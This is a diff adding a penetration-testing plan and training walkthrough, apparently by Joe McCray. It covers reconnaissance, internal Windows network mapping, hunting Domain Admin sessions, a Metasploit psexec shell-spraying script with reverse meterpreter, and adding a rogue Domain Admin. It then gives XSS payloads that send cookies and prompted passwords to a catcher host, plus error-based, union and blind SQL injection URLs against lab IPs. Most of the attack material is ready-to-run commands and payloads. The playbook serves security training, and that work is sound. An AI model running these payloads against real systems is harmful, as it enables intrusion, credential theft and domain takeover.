@@ -1,0 +1,2041 @@
+##################################################
+# Bedri S. Penetration Testing Plan              # 
+# By Joe McCray                                  #
+##################################################
+
+The purpose of this document is to provide Bedri with a tactical pentest plan.
+
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+-=-=-=-=-=- Phase 1 -=-=-=-=-=-
+
+
+##########################################
+# Step 1: External Target Identification #
+##########################################
+Find all of the IP ranges owned by your target company via the following websites:
+- https://www.robtex.com/
+- http://toolbar.netcraft.com/site_report
+- https://addons.mozilla.org/en-US/firefox/addon/passiverecon/ (Install this add-on and enumerate as much info as possible)
+
+
+#################
+# Step 2: OSINT #
+#################
+Install this add-on and enumerate as much info as possible
+- https://addons.mozilla.org/en-US/firefox/addon/passiverecon/
+
+
+
+Here is an example of an OSINT report:
+https://s3.amazonaws.com/StrategicSec-Files/OSINT_Innophos_11242010.doc
+
+
+###################################
+# Step 3: Quick Hit Vulnerability #
+###################################
+Step 3a. Make sure that you do at least 50-100 different Google dorks. Do no less than 10 dorks per category.
+
+Be thorough, and really look for vulnerabilities and data leakages that are relevant to what you learned while doing your OSINT work.
+https://www.exploit-db.com/google-hacking-database/
+
+
+Step 3b. Look to see if they have already been breached
+Place targetgcompany.com in the search box of the link below to look known breaches
+http://zone-h.com/search
+
+Replace targetgcompany.com with your target domain name to look for known XSS vulnerabilities in the site.
+http://xssed.com/search?key=targetcompany.com       
+
+Step 3c. Look for weak SSL implementations
+- https://www.ssllabs.com/ssltest/
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+-=-=-=-=-=- Phase 2 -=-=-=-=-=-
+##########################
+# Download the attack VM #
+##########################
+https://s3.amazonaws.com/StrategicSec-VMs/StrategicsecUbuntu14.zip
+user: strategicsec
+pass: strategicsec
+
+
+############################################
+# Identifying External Security Mechanisms #
+############################################
+ 
+sudo /sbin/iptables -F
+cd /home/strategicsec/toolz
+ 
+ 
+ 
+###########################
+# Target IP Determination #
+###########################
+cd /home/strategicsec/toolz
+perl blindcrawl.pl -d targetgcompany.com
+ 
+-- Take each IP address and look ip up here:
+http://www.networksolutions.com/whois/index.jsp
+ 
+cd ~/toolz/fierce2
+fierce -dns targetgcompany.com
+cd ..
+ 
+ 
+ 
+cd ~/toolz/
+./ipcrawl 148.87.1.1 148.87.1.254                               (DNS forward lookup against an IP range)
+ 
+ 
+sudo nmap -sL 148.87.1.0-255
+sudo nmap -sL 148.87.1.0-255 | grep oracle
+ 
+sudo nmap -p 443,444,8443,8080,8088 --script=ssl-cert --open 148.87.1.0-255             
+Reference: 
+http://blog.depthsecurity.com/2012/01/obtaining-hostdomain-names-through-ssl.html
+ 
+ 
+ 
+###########################
+# Load Balancer Detection #
+###########################
+ Here are some command-line options to use for identifying load balancers:
+ 
+dig google.com
+ 
+cd ~/toolz
+./lbd-0.1.sh targetgcompany.com
+ 
+ 
+halberd targetgcompany.com
+
+ 
+ 
+######################################
+# Web Application Firewall Detection #
+######################################
+ 
+cd ~/toolz/wafw00f
+python wafw00f.py http://www.targetgcompany.com
+
+cd ~/toolz/
+sudo nmap -p 80 --script http-waf-detect.nse targetgcompany.com
+ 
+sudo nmap -p 80 --script http-waf-detect.nse targetgcompany.com
+ 
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+-=-=-=-=-=- Phase 3 -=-=-=-=-=-
+
+
+####################################
+# Step 1: Internal Network Mapping #
+####################################
+Reference:
+https://blog.netspi.com/10-techniques-for-blindly-mapping-internal-networks/
+
+Find all of the internal IP ranges owned by your target company via the following methods:
+
+1. DHCP Information
+2. Sniffing Network Traffic
+3. ARP Broadcasting
+4. Net View
+5. DNS Zone Transfer
+6. DNS Lookups
+7. Domain Computer Accounts
+8. Trace Route
+9. Ping Scan Known Subnets
+10. Port Scans Known Subnets
+
+DHCP Information
+----------------
+If DHCP is configured, it can provide a few pieces of information that are helpful when mapping the network. DHCP information can be viewed with IPCONFIG in Windows. You should be able to glean the following information.
+
+    IP address The DHCP IP address will give you at least one active subnet that can be used later to identify live systems and services via different scanning techniques.
+    Gateway IP Address The gateway IP address on your subnet is most likely addressed the same way on all of the subnets across the environment Combined with some basic ping scans this can be very useful for quickly enumerating live networks. For example, if your gateway is 192.168.72.3, then you may be able to identify other subnets by pinging 192.168.71.3, 192.168.70.3, etc.
+    DNS Server IP Address Similar to the gateway IP addresses, the DNS server IP addresses are commonly addresses the same way across all subnets.
+    Domain Name The domain is important, because it will help us quickly leverage DNS records and Active Directory computer accounts in later steps. If you’re interested in more ways to enumerate active domains I’ve provided 5 methods in a previously blog called Introduction to Windows Dictionary Attacks.
+
+Sniffing Network Traffic
+------------------------
+Sniffing is a great passive method for mapping networks and systems. Typically, you’ll see a lot of broadcast traffic such as DNS, NBNS, BROWSER, and Cisco protocols that reveal hostnames, active subnets, VLANS, and domain names. Also, sniffing can be a handy way to find a valid IP address if DHCP is not configured on the network. Usually after watching traffic patterns for a little bit you can determine a gateway and a subnet. Then, after a little trial and error, you should be able to assign yourself a static IP address that will allow you to conduct more active network mapping. Of course there are quite of few sniffing tools that can be used, but on Windows I like Wireshark, Network Miner, and Cain. Also, TCPDump and Tshark can be handy for scripting on both Windows and Linux. Regardless of the OS or tool you choose, make sure to sniff in promiscuous mode to help ensure that you don’t miss any network traffic. Below are basic examples for starting Tshark and TCPDump and writing the output to a file.
+
+    tcpdump -i eth1 -nnvvXS -w outputfile
+    tshark -i 1 -VV -w outputfile
+
+
+ARP Broadcasting
+----------------
+Since we are on the general topic of broadcast traffic I think it makes sense to touch on ARP broadcasting briefly. Basically, sending out ARP requests for each IP address on a subnet and sniffing the responses is a quick way to determine live hosts. I like using Cain for this, but I’m sure there are other great tools out there as well. If you have one that you really like let me know and I’ll update this blog.
+Net View
+
+Net view is a native Windows command that can be used to quickly enumerate other Windows systems within your broadcast domain. Below are a few variations of the command.
+
+    net view
+    net view /ALL /Domain:demo.com
+
+Note: Don’t forget to ping the hostnames for IP addresses and subnets. Also, keep in mind that sometimes you will need to ping the systems using their fully qualified domain names if you’re not on a domain system.
+DNS Zone Transfer
+
+A DNS zone transfer essentially allows a client system to obtain a copy of the DNS database for the target domain. For the sake of clarity, that means all of the IP address and DNS name mappings. Below are a few examples of zone transfer commands.
+
+    dig axfr Domain.com
+    dig @serverip axfr Domain.com
+
+Note: Don’t forget to add the results to your system and network lists.
+DNS SRV Queries
+
+Even if you are not able to get a zone transfer to work there are often other DNS lookup options available. You should lookup all of the standard DNS records for completeness, but for quick results I like targeting SRV records. One example for quickly automating SRV record lookups has been listed below. Note: The “services.txt” file is just a list of service names pulled from the “C:windowsSystem32driversetcservices” file in Windows.
+
+    for /f “tokens=*” %i in ('type services.txt') do nslookup -type=SRV _%i._tcp.domain.com | grep -v "Server:" | grep -v "Address:" | grep -v "^$">> servers.txt
+
+
+Domain Computer Accounts
+------------------------
+Every computer attached to a Windows domain has a computer account that is registered with Active Directory. Each of those active directory computer accounts is named after the computername and appended with a “$”. So for example, if the computer name is “Workstation01”, then the associated computer account would be named “Workstation01$”. Thanks to this convenient naming convention we can get a list of systems and subnets associated with the domain. There are a number of ways to accomplish this goal, but I’m only going to provide one, because it’s usually the most successful.
+
+    Grab list of domain controllers from last step for each domain.
+        nslookup -type=SRV _ldap._tcp.
+    Create null session to each domain controller
+        Net use \ipc$ “” /user:””
+    Enumerate all domain user accounts.
+        ruby c:metasploitmsf3msfcli auxiliary/scanner/smb/smb_lookupsid SMBDomain=. MaxRID=10000 RHOSTS= E > domain_users.txt
+    Parse for users with $ at the end of their name, most if not all will be computer accounts.
+        grep -i "user=" domain_users.txt | gawk -F " " "{print $3}" | gawk -F "USER=" "{print $2}" | grep -i "$" | gawk -F "$" "{print $1}" | sort | uniq 2>nul 1> domain_users_clean.txt
+    Ping systems using fully qualified domain names to get IP Addresses. Where domainname.com is the target domain.
+        For /F “tokens=*” %i in (type ‘domain_users_clean.txt) do ping %i.domainname.com
+    Once again be sure to parse out the subnets for the upcoming steps.
+
+Traceroute
+----------
+The next objective is to identify live networks that exist between you and the subnets you’ve identified so far. To do that we’ll use traceroute. Traceroute is a diagnostic tool that can provide route information using ICMP. In Linux the tools is called traceroute in Windows its call tracert. I recommend simply tracerouting to the gateway or DNS server for each network instead of tracerouting every system. Either way, make sure to add the newly identified networks to that list of subnets you’ve been collecting. Below is another quick and dirty script example. Note: This can take a while, especially if you have a long list of networks to trace. I typically I limit the number of hops to 10 for most networks to save some time.
+
+    for /F " " %i in ('type gateways.txt') do tracert -h 10 %i | grep -v "out" | gawk -F " " " {print $8}" | sort
+
+
+Ping Scan Known Subnets
+-----------------------
+Now that we have a larger list of networks we can start enumerating some systems. Feel free to dust of nmap for some ping scanning.
+
+    Nmap –sP –iL networks.txt –oA livesystems_icmp
+
+
+Port Scans Known Subnets
+------------------------
+In some cases, live systems are configured to ignore ICMP requests. For that reason it’s important to also perform some basic discovery scans. Targeting a handful of common services will usually do the trick. Below is a quick nmap example.
+
+    Nmap –sS –Pn –p21,22,23,25,80,110,443,513,3389,6000 –iL networks.txt –oA livesystems_disco
+
+
+###########################################
+# Step 2: Finding hosts with DA processes #
+###########################################
+Reference:
+https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/
+
+
+1. Checking Locally
+2. Querying Domain Controllers for Active Domain User Sessions
+3. Scanning Remote Systems for Running Tasks
+4. Scanning Remote Systems for NetBIOS Information
+5. PSExec Shell Spraying Remote Systems for Auth Tokens
+
+Technique 1: Checking Locally
+-----------------------------
+Always check the initially compromised system first. There’s really no point is running around the network looking for Domain Admin processes if you already have one. Below is a simple way to check if any Domain Admin processes are running using native commands:
+
+    Run the following command to get a list of domain admins:
+
+    net group “Domain Admins” /domain
+    Run the following command to list processes and process owners. The account running the process should be in the 7th column.
+
+    Tasklist /v
+    Cross reference the task list with the Domain Admin list to see if you have a winner.
+
+It would be nice if Domain Admin processes were always available on the system initially compromised, but sometimes that is not the case. So the next four techniques will help you find Domain Admin process on remote domain systems.
+
+Technique 2: Querying Domain Controllers for Active Domain User Sessions
+------------------------------------------------------------------------
+To my knowledge this technique is a NetSPI original. We wanted a way to identify active Domain Admin processes and logins without having to spray shells all over the network or do any scanning that would set off IDS. Eventually it occurred to us to simply query the domain controllers for a list of active domain user sessions and cross reference it with the Domain Admin list. The only catch is you have to query all of the domain controllers. Below I’ve provided the basic steps to get list of systems with active Domain Admin sessions as a domain user:
+
+    Gather a list of Domain Controllers from the "Domain Controllers" OU using LDAP queries or net commands. I’ve provided a net command example below.
+
+    net group “Domain Controllers” /domain
+
+    Important Note: The OU is the best source of truth for a list of domain controllers, but keep in mind that you should really go through the process of enumerating trusted domains and targeting those domain controllers as well.
+
+    Alternatively, you can look them up via DNS.
+
+    Nslookup –type=SRV _ldap._tcp.
+    Gather a list of Domain Admins from the "Domain Admins" group using LDAP queries or net commands. I’ve provided a net command example below.
+
+    net group “Domain Admins” /domain
+    Gather a list of all of the active domain sessions by querying each of the domain controllers using Netsess.exe. Netsess is a great tool from Joe Richards that wraps around the native Windows function “netsessionenum”. It will return the IP Address of the active session, the domain account, the session start time, and the idle time. Below is a command example.
+
+    Netsess.exe –h
+    Cross reference the Domain Admin list with the active session list to determine which IP addresses have active domain tokens on them. In more secure environments you may have to wait for a Domain Admin or Service account with Domain Admin privileges to take actions on the network. What that really means I you’ll have to run through the process multiple time, or script it out. Below is a very quick and dirty Windows command line script that uses netsess. Keep in mind that dcs.txt has a list of domain controllers and admins.txt has a list of Domain Admins.
+
+    FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i && @netsess -h %i 2>nul > sessions.txt &&
+    FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a
+
+I wrote a basic batch script named Get Domain Admins (GDA) which can be download  that automates the whole process. The dependencies are listed in the readme file. I would like to give a shout out to Mark Beard and Ivan Dasilva for helping me out on it. I’ve also created a batch file called Get Domain Users (GDU) for Windows Dictionary attacks which has similar options, but more dependencies. If you interested it can be downloaded by clicking the link above.
+
+
+Technique 3: Scanning Remote Systems for Running Tasks
+------------------------------------------------------
+I typically have success with the first two options. However, I came across this method in a pauldotcom blog by LaNMSteR53 and I thought it was a clever alternative. Once you are running as the shared local administrator account on a domain system you can run the script below to scan systems for Domain Admin Tasks. Similar to the last technique you will need to enumerate the Domain Admins first. In the script below ips.txt contains a list of the target systems and the names.txt contains a list of the Domain Admins.
+
+FOR /F %i in (ips.txt) DO @echo [+] %i && @tasklist /V /S %i /U user /P password 2>NUL > output.txt &&
+FOR /F %n in (names.txt) DO @type output.txt | findstr %n > NUL && echo [!] %n was found running a process on %i && pause
+
+The original post is: Crawling for Domain Admin with Tasklist if you're interested.
+
+
+Technique 4: Scanning Remote Systems for NetBIOS Information
+------------------------------------------------------------
+Some Windows systems still allow users to query for logged in users via the NetBIOS queries. The information can be queried using the native nbtstat tool. The user name is indicated by “<03>” in the nbtstat results.
+
+    Below is another quick and dirty Windows command line script that will scan remote systems for active Domain Admins sessions. Note: The script can be ran as a non-domain user.
+
+    for /F %i in (ips.txt) do @echo [+] Checking %i && nbtstat -A %i 2>NUL >nbsessions.txt && FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n > NUL && echo [!] %n was found logged into %i
+    You can also use the nbtscan tool which runs a little faster. It can be downloaded here. Another basic script example is below.
+
+    for /F %i in (ips.txt) do @echo [+] Checking %i && nbtscan -f %i 2>NUL >nbsessions.txt && FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n > NUL && echo [!] %n was found logged into %i
+
+
+Technique 5: PSExec Shell Spraying Remote Systems for Auth Tokens
+-----------------------------------------------------------------
+Psexec “Shell spraying” is the act of using the Psexec module in Metasploit to install shells (typically meterpreter) on hundreds of systems using shared local administrative credentials. Many pentesters use this method in concert with other Metasploit functionality to identify Domain Admin tokens. This is my least favorite technique, but since a large portion of the pentest community is actively using it I feel that I needed to include it. I like getting shells as much as the next guy, but kicking off 500 hundred of them in a production environment could cause availability issues that clients will be really unhappy with. To be fair, having 500 shells does mean you can scrape data faster, but I still think it creates more risk than value. Regardless, below is the process I have seen a lot of people using:
+
+    Install Metasploit 3.5 or greater.
+    Copy paste script below to a text file and save into the Metasploit directory as psexec_spray.rc. I originally found this script on Jabra’s blog.
+
+    #Setup Multi Handler to accept multiple incoming connections use multi/handler setg PAYLOAD windows/meterpreter/reverse_tcp setg LHOST 0.0.0.0 setg LPORT 55555 set ExitOnSession false exploit -j -z
+
+    #Setup Credentials use windows/smb/psexec set SMBUser set SMBPass
+
+    #Setup Domain as local host unless using domain credentials set SMBDomain. #Disable playload handler in psexec modules (using multi handler) set DisablePayloadHandler true #Run Ruby code to scan desired network range using some REX API stuff - range walker #note: could also accept ip addresses from a file by replacing rhosts =”192.168.74.0/24” with rhosts = File.readlines(“c:systems.txt”) require 'rex/socket/range_walker' rhosts = "192.168.1.0/24" iplist = Rex::Socket::RangeWalker.new(rhosts) iplist.each do |rhost|      #self allows for execution of commands in msfconsole      self.run_single("set RHOST #{rhost}")      #-j-z send the session to the background      self.run_single("exploit -j -z") end
+    Update the smbuser and smbpass parameters.
+    Issue the following command to run the script. The psexec_spray.rc script will attempt to blindly install meterpreter shells on every system in the 192.168.1.0/24 network using the provided credentials.
+
+    msfconsole –r psexec_spray.rc
+    You can then use the Metasploit module token_hunter to identify Domain Admin tokens on each of the shelled systems. I’ve outlined the steps below.
+        Create a file containing a list of the Domain Admins like so: COMPANYjoe-admin COMPANYbill-admin COMPANYdavid-admin
+        Load the token_hunter module in the msfconsole msf> load token_hunter
+        Run token hunter to list the sessions containing Domain Admin tokens. msf> token_hunt_user -f /tmp/domain-admin.txt
+    Alternatively, you can use the following command to get a list of currently logged in users from each of the shelled system and manually look for Domain Admins.
+
+    Sessions –s loggedin
+
+
+What Now?
+---------
+If you already have a meterpreter session you can use Incognito to impersonate the Domain Admin, or add a new one. Incognito can attempt to add a new Domain Admin blindly by iterating through all of the available authencation tokens on the system. Below are the basic commands to do that in meterpreter.
+
+    Load Incognito in your active meterpreter session with the following command:
+
+    load incongnito
+    Attempt to add a Domain Admin with the authentication tokens on the system:
+
+    add_user -h
+    add_group ""Domain Admins"" -h
+
+If you’re interested in creating a new Domain Admin using another option you can use the instructions below:
+
+    In the meterpreter console, type the following command to view processes:
+
+    ps
+    In the meterpreter console, find a domain admin session and migrate to using the following command:
+
+    migrate
+    In the meterpreter console, type the following command get a OS shell:
+
+    shell
+    Type the following native Windows command to add a new Domain Admin:
+
+    net user /add /domain
+    net group “Domain Admins” /add /domain
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+-=-=-=-=-=- Phase 4 -=-=-=-=-=-
+
+
+#################################
+# Step 1: Internal Bruteforcing #
+#################################
+Reference:
+ https://blog.netspi.com/introduction-to-windows-dictionary-attacks/
+
+
+
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+Below this line = not complete
+ 
+#######################################################
+# Day 1: 3rd Party Scanning, and scanning via proxies #
+#######################################################
+ 
+https://www.shodan.io
+ 
+        Create a FREE account and login
+ 
+        net:129.188.8.0/24
+ 
+ 
+ 
+cd /home/strategicsec/toolz/
+perl proxyfinder-0.3.pl multiproxy 3 proxies.txt        <-- This takes a long time to run
+ 
+ 
+ 
+sudo vi /etc/proxychains.conf                           <--- Make sure that last line of the file is: ocks4  127.0.0.1 9050
+ 
+ 
+ 
+ 
+----------------------------------------------------------------------
+vi ~/toolz/fix-proxychains-dns.sh
+ 
+#!/bin/bash
+# This script is called by proxychains to resolve DNS names
+# DNS server used to resolve names
+# Reference: http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html
+DNS_SERVER=4.2.2.2
+ 
+if [ $# = 0 ] ; then
+echo " usage:"
+echo " proxyresolv <hostname> "
+exit
+fi
+ 
+export LD_PRELOAD=libproxychains.so.3
+dig $1 @$DNS_SERVER +tcp | awk '/A.+[0-9]+\.[0-9]+\.[0-9]/{print $5;}'
+-----------------------------------------------------------------------
+ 
+ 
+sudo ntpdate pool.ntp.org
+ 
+tor-resolve strategicsec.com
+ 
+proxychains nmap -sT -p80 52.11.62.192
+ 
+proxychains nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8080,10000 52.11.62.192
+ 
+ 
+If you want to block tor exit nodes you get a list from here:
+http://rules.emergingthreats.net/blockrules/emerging-tor-BLOCK.rules
+ 
+You probably should also block things like:
+http://rules.emergingthreats.net/blockrules/emerging-rbn-BLOCK.rules                    <----- Russian Business Network IPs
+http://rules.emergingthreats.net/blockrules/emerging-botcc.rules                        <----- BotNet Command and Control Servers
+http://rules.emergingthreats.net/blockrules/emerging-rbn-malvertisers-BLOCK.rules       <----- Malware Advertisers
+ 
+Here is where you can download the perl script to automatically update your firewall each day (create a cron job for it).
+http://doc.emergingthreats.net/bin/view/Main/EmergingFirewallRules
+
+
+
+
+
+
+##################################
+# Basic: Web Application Testing #
+##################################
+
+
+The basics of web app pentesting
+
+Start with simple firefox addons:
+
+- ShowIP			https://addons.mozilla.org/en-US/firefox/addon/showip/
+- Server Spy			https://addons.mozilla.org/en-US/firefox/addon/server-spy/
+- FoxyProxy			https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
+- Tamper Data			https://addons.mozilla.org/en-US/firefox/addon/tamper-data/
+
+A good list of web app testing add ons for Firefox:
+https://addons.mozilla.org/en-us/firefox/collections/adammuntner/webappsec/
+
+
+The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
+	
+	1. Does the website talk to a DB?
+		- Look for parameter passing (ex: site.com/page.php?id=4)
+		- If yes - try SQL Injection
+
+	2. Can I or someone else see what I type?
+		- If yes - try XSS
+
+	3. Does the page reference a file?
+		- If yes - try LFI/RFI
+
+Let's start with some manual testing against 54.149.82.150 in the lab network. 
+
+
+Start here:
+http://54.149.82.150/
+
+
+There's no parameter passing on the home page so the answer to question 1 is NO.
+There is however a search box in the top right of the webpage, so the answer to question 2 is YES.
+
+Try an XSS in the search box on the home page:
+<script>alert(123);</script>
+
+Doing this gives us the following in the address bar:
+http://54.149.82.150/BasicSearch.aspx?Word=<script>alert(123);</script>
+
+Ok, so we've verified that there is XSS in the search box. 
+
+Let's move on to the search box in the left of the page.
+
+Let's give the newsletter signup box a shot
+
+
+
+
+###################################################################
+# What is XSS                                                     #
+# https://s3.amazonaws.com/StrategicSec-Files/2-Intro_To_XSS.pptx #
+###################################################################
+
+OK - what is Cross Site Scripting (XSS)
+
+1. Use Firefox to browse to the following location:
+
+	http://54.186.248.116/xss_practice/
+
+	A really simple search page that is vulnerable should come up. 
+
+
+
+
+2. In the search box type:
+	
+	<script>alert('So this is XSS')</script>
+
+
+	This should pop-up an alert window with your message in it proving XSS is in fact possible.
+	Ok, click OK and then click back and go back to http://54.186.248.116/xss_practice/
+
+
+3. In the search box type:
+	
+	<script>alert(document.cookie)</script>
+
+
+	This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
+	Ok, click OK and then click back and go back to http://54.186.248.116/xss_practice/
+
+4. Now replace that alert script with:
+
+	<script>document.location="http://54.186.248.116/xss_practice/cookie_catcher.php?c="+document.cookie</script> 
+
+
+This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.
+
+
+5. Now view the stolen cookie at:
+	http://54.186.248.116/xss_practice/cookie_stealer_logs.html
+
+
+The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.
+
+
+
+
+
+
+############################
+# A Better Way To Demo XSS #
+############################
+
+
+Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.
+
+
+Use Firefox to browse to the following location:
+
+	http://54.186.248.116/xss_practice/
+
+
+
+Paste this in the search box
+----------------------------
+
+
+Option 1
+--------
+
+<script>
+password=prompt('Your session is expired. Please enter your password to continue',' '); 
+document.write("<img src=\"http://54.186.248.116/xss_practice/passwordgrabber.php?password=" +password+"\">");
+</script>
+
+
+Now view the stolen cookie at:
+	http://54.186.248.116/xss_practice/passwords.html
+
+
+
+Option 2
+--------
+<script>
+username=prompt('Please enter your username',' ');
+password=prompt('Please enter your password',' ');
+document.write("<img src=\"http://54.186.248.116/xss_practice/unpw_catcher.php?username="+username+"&password="+password+"\">");
+</script>
+
+
+
+
+Now view the stolen cookie at:
+http://54.186.248.116/xss_practice/username_password_logs.html
+
+
+
+
+
+Moving on to the login page.
+http://54.149.82.150/login.aspx
+
+I entered a single quote (') for both the user name and the password. I got the following error:
+
+-----------------------------------------------------------------
+ 'Users//User[@Name=''' and @Password=''']' has an invalid token.
+Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.
+
+Exception Details: System.Xml.XPath.XPathException: 'Users//User[@Name=''' and @Password=''']' has an invalid token.
+
+Source Error:
+
+
+Line 112:            doc.Load(Server.MapPath("") + @"\AuthInfo.xml");
+Line 113:            string credential = "Users//User[@Name='" + UserName + "' and @Password='" + Password + "']";
+Line 114:            XmlNodeList xmln = doc.SelectNodes(credential);
+Line 115:            //String test = xmln.ToString();            
+Line 116:            if (xmln.Count > 0)
+
+-----------------------------------------------------------------
+
+
+Hmm....System.Xml.XPath.XPathException.....that's not SQL.
+
+WTF is this:
+Line 112:            doc.Load(Server.MapPath("") + @"\AuthInfo.xml");
+
+
+Let's check it out:
+http://54.149.82.150/AuthInfo.xml
+
+Looks like we found passwords!!!!!!!!!!
+
+
+Looks like there no significant new functionality after logging in with the stolen credentials.
+
+Going back to the homepage...let's see if we can see anything. Figured I'd click on one of the links
+
+
+http://54.149.82.150/bookdetail.aspx?id=2
+
+
+Ok, there is parameter passing (bookdetail.aspx?id=2).
+
+The page name is:		bookdetail.aspx
+The parameter name is:		id
+The paramber value is:		2
+
+
+Let's try throwing a single quote (') in there:
+
+http://54.149.82.150/bookdetail.aspx?id=2'
+
+
+I get the following error:
+
+Unclosed quotation mark after the character string ''.
+Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.
+
+Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ''.
+
+
+
+#############################################################################
+# SQL Injection                                                             #
+# https://s3.amazonaws.com/StrategicSec-Files/1-Intro_To_SQL_Intection.pptx #
+#############################################################################
+
+
+- Another quick way to test for SQLI is to remove the paramter value
+
+ 
+#############################
+# Error-Based SQL Injection #
+#############################
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(1))--
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(2))--
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(3))--
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(4))--
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(N))-- 	NOTE: "N" - just means to keep going until you run out of databases
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85))--
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'bookmaster')--
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'sysdiagrams')--
+
+
+
+
+#############################
+# Union-Based SQL Injection #
+#############################
+http://54.149.82.150/bookdetail.aspx?id=2 order by 100--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 50--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 25--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 10--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 5--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 6--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 7--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 8--
+http://54.149.82.150/bookdetail.aspx?id=2 order by 9--
+http://54.149.82.150/bookdetail.aspx?id=2 union all select 1,2,3,4,5,6,7,8,9--
+
+	We are using a union select statement because we are joining the developer's query with one of our own.
+	Reference: 
+	http://www.techonthenet.com/sql/union.php
+	The SQL UNION operator is used to combine the result sets of 2 or more SELECT statements. 
+	It removes duplicate rows between the various SELECT statements.
+
+	Each SELECT statement within the UNION must have the same number of fields in the result sets with similar data types.
+
+http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--
+
+	Negating the paramter value (changing the id=2 to id=-2) will force the pages that will echo back data to be displayed.
+
+http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
+http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
+http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
+http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--
+
+
+
+
+
+- Another way is to see if you can get the backend to perform an arithmetic function
+http://54.149.82.150/bookdetail.aspx?id=(2)	
+http://54.149.82.150/bookdetail.aspx?id=(4-2)	
+http://54.149.82.150/bookdetail.aspx?id=(4-1)
+
+
+
+http://54.149.82.150/bookdetail.aspx?id=2 or 1=1-- 
+http://54.149.82.150/bookdetail.aspx?id=2 or 1=2-- 
+http://54.149.82.150/bookdetail.aspx?id=1*1 
+http://54.149.82.150/bookdetail.aspx?id=2 or 1 >-1# 
+http://54.149.82.150/bookdetail.aspx?id=2 or 1<99# 
+http://54.149.82.150/bookdetail.aspx?id=2 or 1<>1# 
+http://54.149.82.150/bookdetail.aspx?id=2 or 2 != 3-- 
+http://54.149.82.150/bookdetail.aspx?id=2 &0#
+
+
+
+
+
+###############################
+# Blind SQL Injection Testing #
+###############################
+Time-Based BLIND SQL INJECTION - EXTRACT DATABASE USER
+  	 
+3 - Total Characters
+http://54.149.82.150/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+http://54.149.82.150/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+http://54.149.82.150/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'-- 		(Ok, the username is 3 chars long - it waited 10 seconds)
+
+Let's go for a quick check to see if it's DBO
+http://54.149.82.150/bookdetail.aspx?id=2; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'--
+
+Yup, it waited 10 seconds so we know the username is 'dbo' - let's give you the syntax to verify it just for fun.
+
+D  - 1st Character
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'-- 	
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'-- 	(Ok, first letter is a 100 which is the letter 'd' - it waited 10 seconds)
+ 
+B - 2nd Character
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
+http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--  	Ok, good it waited for 10 seconds
+ 
+O - 3rd Character
